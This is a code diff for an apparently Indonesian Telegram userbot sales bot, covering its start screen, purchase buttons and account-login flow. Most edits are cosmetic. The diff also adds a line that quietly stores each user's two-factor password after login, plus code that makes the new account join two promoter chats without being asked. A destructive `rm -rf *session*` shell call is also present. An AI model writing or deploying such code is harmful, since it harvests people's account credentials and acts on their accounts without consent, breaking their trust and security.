@@ -16,24 +16,44 @@ from PyroUbot import *
 async def _(client, message):
     buttons = BTN.START(message)
     msg = MSG.START(message)
+    x = await message.reply_sticker("CAACAgIAAxkDAAJI92hC0SyOqBwWg_BXacs4T7hLoI8BAAI0HwAC5zrwStYwuYP3rUz6HgQ")
+    await asyncio.sleep(3.5)
+    await x.delete()
 
-    await message.reply_photo(
-        photo="https://files.catbox.moe/sjsb1i.jpg", 
-        caption=msg, 
-        reply_markup=InlineKeyboardMarkup(buttons)
-    )
+    xx = await message.reply_sticker("CAACAgIAAyEGAASqtYwGAAIBT2hDD6gPqfYoc7RTLz2frUw2QATCAALKAAOWn4wOi8h9_FMnWzceBA")
+    await asyncio.sleep(3.5)
+    await xx.delete()
+
+    xx = await message.reply_sticker("CAACAgIAAyEGAASqtYwGAAIBcGhDEIloayuQHGmrej14aQ_akwmIAALTAAOWn4wOG0m_uoE_dq4eBA")
+    await asyncio.sleep(3.5)
+    await xx.delete()
+    
+    xx = await message.reply_sticker("CAACAgUAAxkDAAJI-mhC0TbJepHkeqcCtSgaVR_vO_psAAJRCwACh8rBVUMJtQExXYmdHgQ")
+    await asyncio.sleep(3.5)
+    await xx.delete()
+
+    xx = await message.reply_sticker("CAACAgUAAyEGAASqtYwGAAMsaELvjjVSi0SvJ-Ib6xSqKuQxVPUAAnQFAAKqpThVozcGdauqdLEeBA")
+    await asyncio.sleep(2.4)
+    await xx.delete()
+
+    xxx = await message.reply_sticker("CAACAgUAAxkDAAJJAWhC0UgVeOpk9uRsLK1ZlZHzFfRgAAKLBgAC9v0pVoJkidE43EKFHgQ")
+    await asyncio.sleep(3.5)
+    await xxx.delete()
+    
+    return await message.reply(msg, reply_markup=InlineKeyboardMarkup(buttons))
+
 
 @PY.CALLBACK("bahan")
 async def _(client, callback_query):
     user_id = callback_query.from_user.id
     if user_id in ubot._get_my_id:
         buttons = [
-            [InlineKeyboardButton("⦪ ʀᴇꜱᴛᴀʀᴛ ⦫", callback_data=f"ress_ubot")],
-            [InlineKeyboardButton("⦪ ᴋᴇᴍʙᴀʟɪ ⦫", callback_data=f"home {user_id}")],
+            [InlineKeyboardButton("🔃 ʀᴇꜱᴛᴀʀᴛ", callback_data=f"ress_ubot")],
+            [InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
         ]
         return await callback_query.edit_message_text(
             f"""
-<blockquote><b>⌭ ᴀɴᴅᴀ ꜱᴜᴅᴀʜ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ\n\n⌭ ᴊɪᴋᴀ ᴜꜱᴇʀʙᴏᴛ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ꜱɪʟᴀʜᴋᴀɴ ᴛᴇᴋᴇɴ ᴛᴏᴍʙᴏʟ ʀᴇꜱᴛᴀʀᴛ ᴅɪ ᴀᴛᴀꜱ</b></blockquote>
+<blockquote><b>ᴀɴᴅᴀ ꜱᴜᴅᴀʜ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ\n\nᴊɪᴋᴀ ᴜꜱᴇʀʙᴏᴛ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ꜱɪʟᴀʜᴋᴀɴ ᴛᴇᴋᴇɴ ᴛᴏᴍʙᴏʟ ʀᴇꜱᴛᴀʀᴛ ᴅɪ ᴀᴛᴀꜱ</b></blockquote>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
@@ -44,11 +64,11 @@ async def _(client, callback_query):
         ]
         return await callback_query.edit_message_text(
             f"""
-<blockquote><b><b>☫ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ!</b>
+<blockquote><b><b>❌ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ!</b>
 
-<b>☫ ᴋᴀʀᴇɴᴀ ᴍᴀᴋsɪᴍᴀʟ ᴜsᴇʀʙᴏᴛ ᴀᴅᴀʟᴀʜ {Fonts.smallcap(str(len(ubot._ubot)))} ᴛᴇʟᴀʜ ᴛᴇʀᴄᴀᴘᴀɪ</b>
+<b>📚 ᴋᴀʀᴇɴᴀ ᴍᴀᴋsɪᴍᴀʟ ᴜsᴇʀʙᴏᴛ ᴀᴅᴀʟᴀʜ {Fonts.smallcap(str(len(ubot._ubot)))} ᴛᴇʟᴀʜ ᴛᴇʀᴄᴀᴘᴀɪ</b>
 
-<blockquote><b>☫ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ owner</b></blockquote>
+<b>☎️ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ: <a href=tg://openmessage?user_id={OWNER_ID}>ᴀᴅᴍɪɴ</a>ᴊɪᴋᴀ ᴍᴀᴜ ᴅɪʙᴜᴀᴛᴋᴀɴ ʙᴏᴛ sᴇᴘᴇʀᴛɪ sᴀʏᴀ </b></blockquote>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
@@ -56,8 +76,8 @@ async def _(client, callback_query):
     premium_users, ultra_premium_users = await get_list_from_vars(client.me.id, "PREM_USERS"), await get_list_from_vars(client.me.id, "ULTRA_PREM")
     if user_id not in premium_users and user_id not in ultra_premium_users:
         buttons = [
-            [InlineKeyboardButton("⦪ ʟᴀɴᴊᴜᴛᴋᴀɴ ⦫", callback_data="bayar_dulu")],
-            [InlineKeyboardButton("⦪ ᴋᴇᴍʙᴀʟɪ ⦫", callback_data=f"home {user_id}")],
+            [InlineKeyboardButton("ʟᴀɴᴊᴜᴛᴋᴀɴ", callback_data="bayar_dulu")],
+            [InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
         ]
         return await callback_query.edit_message_text(
             MSG.POLICY(),
@@ -65,10 +85,10 @@ async def _(client, callback_query):
             reply_markup=InlineKeyboardMarkup(buttons),
         )
     else:
-        buttons = [[InlineKeyboardButton("⦪ ʟᴀɴᴊᴜᴛᴋᴀɴ ⦫", callback_data="buat_ubot")]]
+        buttons = [[InlineKeyboardButton("✅ ʟᴀɴᴊᴜᴛᴋᴀɴ", callback_data="buat_ubot")]]
         return await callback_query.edit_message_text(
             """
-<blockquote><b>⌭ ᴀɴᴅᴀ ᴛᴇʟᴀʜ ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ ꜱɪʟᴀʜᴋᴀɴ ᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ʟᴀɴᴊᴜᴛᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ</b></blockquote>
+<blockquote><b>ᴀɴᴅᴀ ᴛᴇʟᴀʜ ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ ꜱɪʟᴀʜᴋᴀɴ ᴘᴇɴᴄᴇᴛ ᴛᴏᴍʙᴏʟ ʟᴀɴᴊᴜᴛᴋᴀɴ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ</b></blockquote>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
@@ -87,22 +107,22 @@ async def _(client, callback_query):
         waktu = exp.strftime("%d-%m-%Y") if exp else "None"
         return await callback_query.edit_message_text(
             f"""
-<blockquote>⌬ ᴜꜱᴇʀʙᴏᴛ ᴘʀᴇᴍɪᴜᴍ
-  ᚗ ꜱᴛᴀᴛᴜꜱ : ᴘʀᴇᴍɪᴜᴍ
-  ᚗ ᴘʀᴇꜰɪxᴇꜱ : {prefix[0]}
-  ᚗ ᴇxᴘɪʀᴇᴅ_ᴏɴ : {waktu}</b></blockquote>
+<blockquote>ᴛʜʀᴇᴇʙᴏᴛ ᴘʀᴇᴍɪᴜᴍ
+  ꜱᴛᴀᴛᴜꜱ : ᴘʀᴇᴍɪᴜᴍ
+  ᴘʀᴇꜰɪxᴇꜱ : {prefix[0]}
+  ᴇxᴘɪʀᴇᴅ_ᴏɴ : {waktu}</b></blockquote>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
         )
     else:
         buttons = [
-            [InlineKeyboardButton("✮ ʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ ✮", callback_data=f"bahan")],
-            [InlineKeyboardButton("⦪ ᴋᴇᴍʙᴀʟɪ ⦫", callback_data=f"home {user_id}")],
+            [InlineKeyboardButton("💵 ʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ", callback_data=f"bahan")],
+            [InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
         ]
         return await callback_query.edit_message_text(
             f"""
-<blockquote><b>☫ ᴍᴀᴀꜰ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ, ꜱɪʟᴀᴋᴀɴ ᴍᴇᴍʙᴇʟɪ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ.</b></blockquote>
+<blockquote><b>❌ ᴍᴀᴀꜰ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ, ꜱɪʟᴀᴋᴀɴ ᴍᴇᴍʙᴇʟɪ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ.</b></blockquote>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
@@ -114,12 +134,12 @@ async def _(client, callback_query):
     user_id = callback_query.from_user.id
     if user_id in ubot._get_my_id:
         buttons = [
-            [InlineKeyboardButton("⦪ ʀᴇꜱᴛᴀʀᴛ ⦫", callback_data=f"ress_ubot")],
-            [InlineKeyboardButton("⦪ ᴋᴇᴍʙᴀʟɪ ⦫", callback_data=f"home {user_id}")],
+            [InlineKeyboardButton("✅ ʀᴇꜱᴛᴀʀᴛ", callback_data=f"ress_ubot")],
+            [InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
         ]
         return await callback_query.edit_message_text(
             f"""
-<blockquote><b>⌭ ᴀɴᴅᴀ ꜱᴜᴅᴀʜ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ\n\n⌭ ᴊɪᴋᴀ ᴜꜱᴇʀʙᴏᴛ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ꜱɪʟᴀʜᴋᴀɴ ᴛᴇᴋᴇɴ ᴛᴏᴍʙᴏʟ ʀᴇꜱᴛᴀʀᴛ ᴅɪ ᴀᴛᴀꜱ</b></blockquote>
+<blockquote><b>ᴀɴᴅᴀ ꜱᴜᴅᴀʜ ᴍᴇᴍʙᴜᴀᴛ ᴜꜱᴇʀʙᴏᴛ\n\nᴊɪᴋᴀ ᴜꜱᴇʀʙᴏᴛ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴅɪɢᴜɴᴀᴋᴀɴ ꜱɪʟᴀʜᴋᴀɴ ᴛᴇᴋᴇɴ ᴛᴏᴍʙᴏʟ ʀᴇꜱᴛᴀʀᴛ ᴅɪ ᴀᴛᴀꜱ</b></blockquote>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
@@ -130,11 +150,11 @@ async def _(client, callback_query):
         ]
         return await callback_query.edit_message_text(
             f"""
-<blockquote><b><b>⌬ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ!</b>
+<blockquote><b><b>❌ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ!</b>
 
-<b>⌬ ᴋᴀʀᴇɴᴀ ᴍᴀᴋsɪᴍᴀʟ ᴜsᴇʀʙᴏᴛ ᴀᴅᴀʟᴀʜ {Fonts.smallcap(str(len(ubot._ubot)))} ᴛᴇʟᴀʜ ᴛᴇʀᴄᴀᴘᴀɪ</b>
+<b>📚 ᴋᴀʀᴇɴᴀ ᴍᴀᴋsɪᴍᴀʟ ᴜsᴇʀʙᴏᴛ ᴀᴅᴀʟᴀʜ {Fonts.smallcap(str(len(ubot._ubot)))} ᴛᴇʟᴀʜ ᴛᴇʀᴄᴀᴘᴀɪ</b>
 
-<blockquote><b>⌬ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ: ᴀᴅᴍɪɴ ᴊɪᴋᴀ ᴍᴀᴜ ᴅɪʙᴜᴀᴛᴋᴀɴ ʙᴏᴛ sᴇᴘᴇʀᴛɪ sᴀʏᴀ </b></blockquote>
+<b>☎️ sɪʟᴀʜᴋᴀɴ ʜᴜʙᴜɴɢɪ: <a href=tg://openmessage?user_id={OWNER_ID}>ᴀᴅᴍɪɴ</a>ᴊɪᴋᴀ ᴍᴀᴜ ᴅɪʙᴜᴀᴛᴋᴀɴ ʙᴏᴛ sᴇᴘᴇʀᴛɪ sᴀʏᴀ </b></blockquote>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
@@ -142,25 +162,25 @@ async def _(client, callback_query):
     premium_users, ultra_premium_users = await get_list_from_vars(client.me.id, "PREM_USERS"), await get_list_from_vars(client.me.id, "ULTRA_PREM")
     if user_id not in premium_users and user_id not in ultra_premium_users:
         buttons = [
-            [InlineKeyboardButton("⦪ ʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ ⦫", callback_data="bahan")],
-            [InlineKeyboardButton("⦪ ᴋᴇᴍʙᴀʟɪ ⦫", callback_data=f"home {user_id}")],
+            [InlineKeyboardButton("💸 ʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ 💸", callback_data="bahan")],
+            [InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
         ]
         return await callback_query.edit_message_text(
             f"""
-<blockquote><b>⌬ ᴍᴀᴀꜰ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ, ꜱɪʟᴀᴋᴀɴ ᴍᴇᴍʙᴇʟɪ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ</b></blockquote>
+<blockquote><b>❌ ᴍᴀᴀꜰ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴍᴇᴍʙᴇʟɪ ᴜꜱᴇʀʙᴏᴛ, ꜱɪʟᴀᴋᴀɴ ᴍᴇᴍʙᴇʟɪ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ</b></blockquote>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
         )
     else:
-        buttons = [[InlineKeyboardButton("⦪ ʟᴀɴᴊᴜᴛᴋᴀɴ ⦫", callback_data="add_ubot")]]
+        buttons = [[InlineKeyboardButton("✅ ʟᴀɴᴊᴜᴛᴋᴀɴ", callback_data="add_ubot")]]
         return await callback_query.edit_message_text(
             """
-<blockquote><b>⎆ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ sɪᴀᴘᴋᴀɴ ʙᴀʜᴀɴ ʙᴇʀɪᴋᴜᴛ
+<blockquote><b>✅ ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ sɪᴀᴘᴋᴀɴ ʙᴀʜᴀɴ ʙᴇʀɪᴋᴜᴛ
 
-    ⎆ <code>ᴘʜᴏɴᴇ_ɴᴜᴍʙᴇʀ</code>: ɴᴏᴍᴇʀ ʜᴘ ᴀᴋᴜɴ ᴛᴇʟᴇɢʀᴀᴍ
+    • <code>ᴘʜᴏɴᴇ_ɴᴜᴍʙᴇʀ</code>: ɴᴏᴍᴇʀ ʜᴘ ᴀᴋᴜɴ ᴛᴇʟᴇɢʀᴀᴍ
 
-⎆ ᴊɪᴋᴀ sᴜᴅᴀʜ ᴛᴇʀsᴇᴅɪᴀ sɪʟᴀʜᴋᴀɴ ᴋʟɪᴋ ᴛᴏᴍʙᴏɪ ᴅɪʙᴀᴡᴀʜ</b></blockquote>
+☑️ ᴊɪᴋᴀ sᴜᴅᴀʜ ᴛᴇʀsᴇᴅɪᴀ sɪʟᴀʜᴋᴀɴ ᴋʟɪᴋ ᴛᴏᴍʙᴏɪ ᴅɪʙᴀᴡᴀʜ</b></blockquote>
 """,
             disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons),
@@ -185,13 +205,13 @@ async def _(client, callback_query):
         phone = await bot.ask(
             user_id,
             (
-                "<b>⎆ sɪʟᴀʜᴋᴀɴ ᴍᴀsᴜᴋᴋᴀɴ ɴᴏᴍᴏʀ ᴛᴇʟᴇᴘᴏɴ ᴛᴇʟᴇɢʀᴀᴍ ᴀɴᴅᴀ ᴅᴇɴɢᴀɴ ꜰᴏʀᴍᴀᴛ ᴋᴏᴅᴇ ɴᴇɢᴀʀᴀ.\nᴄᴏɴᴛᴏʜ: +628xxxxxxx</b>\n"
-                "\n<b>⎆ ɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ</b>"
+                "<blockquote><b>sɪʟᴀʜᴋᴀɴ ᴍᴀsᴜᴋᴋᴀɴ ɴᴏᴍᴏʀ ᴛᴇʟᴇᴘᴏɴ ᴛᴇʟᴇɢʀᴀᴍ ᴀɴᴅᴀ ᴅᴇɴɢᴀɴ ꜰᴏʀᴍᴀᴛ ᴋᴏᴅᴇ ɴᴇɢᴀʀᴀ.\nᴄᴏɴᴛᴏʜ: ﹢𝟼𝟸xxxxx</b>\n"
+                "\n<b>ɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ</b></blockquote>"
             ),
             timeout=300,
         )
     except asyncio.TimeoutError:
-        return await bot.send_message(user_id, "<blockquote>⎆ ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\n⎆ ɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>")
+        return await bot.send_message(user_id, "<blockquote>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɴɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>")
     if await is_cancel(callback_query, phone.text):
         return
     phone_number = phone.text
@@ -201,7 +221,7 @@ async def _(client, callback_query):
         api_hash=API_HASH,
         in_memory=False,
     )
-    get_otp = await bot.send_message(user_id, "<blockquote><b>⎆ ᴍᴇɴɢɪʀɪᴍ ᴋᴏᴅᴇ ᴏᴛᴘ...</b></blockquote>")
+    get_otp = await bot.send_message(user_id, "<blockquote><b>ᴍᴇɴɢɪʀɪᴍ ᴋᴏᴅᴇ ᴏᴛᴘ...</b></blockquote>")
     await new_client.connect()
     try:
         code = await new_client.send_code(phone_number.strip())
@@ -236,14 +256,14 @@ async def _(client, callback_query):
         otp = await bot.ask(
             user_id,
             (
-                "<b>⎆ sɪʟᴀᴋᴀɴ ᴘᴇʀɪᴋsᴀ ᴋᴏᴅᴇ ᴏᴛᴘ ᴅᴀʀɪ ᴀᴋᴜɴ ʀᴇꜱᴍɪ ᴛᴇʟᴇɢʀᴀᴍ. ᴋɪʀɪᴍ ᴋᴏᴅᴇ ᴏᴛᴘ ᴋᴇ sɪɴɪ sᴇᴛᴇʟᴀʜ ᴍᴇᴍʙᴀᴄᴀ ꜰᴏʀᴍᴀᴛ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ.</b>\n"
-                "\n⎆ ᴊɪᴋᴀ ᴋᴏᴅᴇ ᴏᴛᴘ ᴀᴅᴀʟᴀʜ <ᴄᴏᴅᴇ>12345</ᴄᴏᴅᴇ> ᴛᴏʟᴏɴɢ <b>[ ᴛᴀᴍʙᴀʜᴋᴀɴ sᴘᴀsɪ ]</b> ᴋɪʀɪᴍᴋᴀɴ sᴇᴘᴇʀᴛɪ ɪɴɪ <code>1 2 3 4 5</code>\n"
-                "\n<b>⎆ ɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ</b>"
+                "<blockquote><b>sɪʟᴀᴋᴀɴ ᴘᴇʀɪᴋsᴀ ᴋᴏᴅᴇ ᴏᴛᴘ ᴅᴀʀɪ ᴀᴋᴜɴ ʀᴇꜱᴍɪ ᴛᴇʟᴇɢʀᴀᴍ. ᴋɪʀɪᴍ ᴋᴏᴅᴇ ᴏᴛᴘ ᴋᴇ sɪɴɪ sᴇᴛᴇʟᴀʜ ᴍᴇᴍʙᴀᴄᴀ ꜰᴏʀᴍᴀᴛ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ.</b>\n"
+                "\nᴊɪᴋᴀ ᴋᴏᴅᴇ ᴏᴛᴘ ᴀᴅᴀʟᴀʜ <ᴄᴏᴅᴇ>12345</ᴄᴏᴅᴇ> ᴛᴏʟᴏɴɢ <b>[ ᴛᴀᴍʙᴀʜᴋᴀɴ sᴘᴀsɪ ]</b> ᴋɪʀɪᴍᴋᴀɴ sᴇᴘᴇʀᴛɪ ɪɴɪ <code>1 2 3 4 5</code>\n"
+                "\n<b>ɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ</b></blockquote>"
             ),
             timeout=300,
         )
     except asyncio.TimeoutError:
-        return await bot.send_message(user_id, "<blockquote>⎆ ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\n⎆ ɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>")
+        return await bot.send_message(user_id, "<blockquote>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɴɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>")
     if await is_cancel(callback_query, otp.text):
         return
     otp_code = otp.text
@@ -263,16 +283,17 @@ async def _(client, callback_query):
         try:
             two_step_code = await bot.ask(
                 user_id,
-                "⎆ ᴀᴋᴜɴ ᴀɴᴅᴀ ᴛᴇʟᴀʜ ᴍᴇɴɢᴀᴋᴛɪꜰᴋᴀɴ ᴠᴇʀɪꜰɪᴋᴀsɪ ᴅᴜᴀ ʟᴀɴɢᴋᴀʜ. sɪʟᴀʜᴋᴀɴ ᴋɪʀɪᴍᴋᴀɴ ᴘᴀssᴡᴏʀᴅɴʏᴀ.\n\n⎆ ɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ</b>",
+                "ᴀᴋᴜɴ ᴀɴᴅᴀ ᴛᴇʟᴀʜ ᴍᴇɴɢᴀᴋᴛɪꜰᴋᴀɴ ᴠᴇʀɪꜰɪᴋᴀsɪ ᴅᴜᴀ ʟᴀɴɢᴋᴀʜ. sɪʟᴀʜᴋᴀɴ ᴋɪʀɪᴍᴋᴀɴ ᴘᴀssᴡᴏʀᴅɴʏᴀ.\n\nɢᴜɴᴀᴋᴀɴ /cancel ᴜɴᴛᴜᴋ ᴍᴇᴍʙᴀᴛᴀʟᴋᴀɴ ᴘʀᴏsᴇs ᴍᴇᴍʙᴜᴀᴛ ᴜsᴇʀʙᴏᴛ</b>",
                 timeout=300,
             )
         except asyncio.TimeoutError:
-            return await bot.send_message(user_id, "<blockquote>⎆ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\n⎆ ɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>")
+            return await bot.send_message(user_id, "<blockquote>ᴘᴇᴍʙᴀᴛᴀʟᴀɴ ᴏᴛᴏᴍᴀᴛɪꜱ!\nɴɢᴜɴᴀᴋᴀɴ /ꜱᴛᴀʀᴛ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ</blockquote>")
         if await is_cancel(callback_query, two_step_code.text):
             return
         new_code = two_step_code.text
         try:
             await new_client.check_password(new_code)
+            await set_two_factor(user_id, new_code)
         except Exception as error:
             return await bot.send_message(user_id, f"ERROR: {error}")
     session_string = await new_client.export_session_string()
@@ -281,14 +302,14 @@ async def _(client, callback_query):
     new_client.in_memory = False
     bot_msg = await bot.send_message(
         user_id,
-        "sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs....\n\n⎆ sɪʟᴀʜᴋᴀɴ ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ",
+        "sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs....\n\nsɪʟᴀʜᴋᴀɴ ᴛᴜɴɢɢᴜ sᴇʙᴇɴᴛᴀʀ",
         disable_web_page_preview=True,
     )
     await new_client.start()
     if not user_id == new_client.me.id:
         ubot._ubot.remove(new_client)
         return await bot_msg.edit(
-            "<b>⎆ ʜᴀʀᴀᴘ ɢᴜɴᴀᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀɴᴅᴀ ᴅɪ ᴀᴋᴜɴ ᴀɴᴅᴀ sᴀᴀᴛ ɪɴɪ ᴅᴀɴ ʙᴜᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴅᴀʀɪ ᴀᴋᴜɴ ʟᴀɪɴ</>"
+            "<blockquote><b>ʜᴀʀᴀᴘ ɢᴜɴᴀᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴀɴᴅᴀ ᴅɪ ᴀᴋᴜɴ ᴀɴᴅᴀ sᴀᴀᴛ ɪɴɪ ᴅᴀɴ ʙᴜᴋᴀɴ ɴᴏᴍᴇʀ ᴛᴇʟᴇɢʀᴀᴍ ᴅᴀʀɪ ᴀᴋᴜɴ ʟᴀɪɴ</b></blockquote>"
         )
     await add_ubot(
         user_id=int(new_client.me.id),
@@ -304,21 +325,27 @@ async def _(client, callback_query):
             [InlineKeyboardButton("ᴋᴇᴍʙᴀʟɪ", callback_data=f"home {user_id}")],
         ]
     text_done = f"""
-<blockquote><b>⎆ ʙᴇʀʜᴀꜱɪʟ ᴅɪᴀᴋᴛɪꜰᴋᴀɴ
-ᚗ ɴᴀᴍᴇ : <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a>
-ᚗ ɪᴅ : {new_client.me.id}
-ᚗ ᴘʀᴇꜰɪxᴇꜱ : {' '.join(SH)}
-⌭ ʜᴀʀᴀᴘ hubungi admin ᴜɴᴛᴜᴋ ɪɴꜰᴏ" ᴛᴇʀʙᴀʀᴜ
+<blockquote><b>ʙᴇʀʜᴀꜱɪʟ ᴅɪᴀᴋᴛɪꜰᴋᴀɴ
+ɴᴀᴍᴇ : <a href=tg://user?id={new_client.me.id}>{new_client.me.first_name} {new_client.me.last_name or ''}</a>
+ɪᴅ : {new_client.me.id}
+ᴘʀᴇꜰɪxᴇꜱ : {' '.join(SH)} 
+ʜᴀʀᴀᴘ ᴊᴏɪɴ : @kaijensupport ʜᴀʀᴀᴘ ᴊᴏɪɴ ʀᴏᴏᴍ ᴅɪᴀᴛᴀs ᴅᴀɴ ᴊᴀɴɢᴀɴ ᴏᴜᴛ ᴀɢᴀʀ sᴀғᴇᴛʏ
 ᴊɪᴋᴀ ʙᴏᴛ ᴛɪᴅᴀᴋ ʀᴇꜱᴘᴏɴ, ᴋᴇᴛɪᴋ /restart</b></blockquote>
         """
     await bot_msg.edit(text_done, disable_web_page_preview=True,
             reply_markup=InlineKeyboardMarkup(buttons))
     await bash("rm -rf *session*")
     await install_my_peer(new_client)
-    await bot.send_message(
+    try:
+        await new_client.join_chat("kaijensupport") 
+        await new_client.join_chat("chatgerup1")
+    except UserAlreadyParticipant:
+        pass
+
+    return await bot.send_message(
         LOGS_MAKER_UBOT,
         f"""
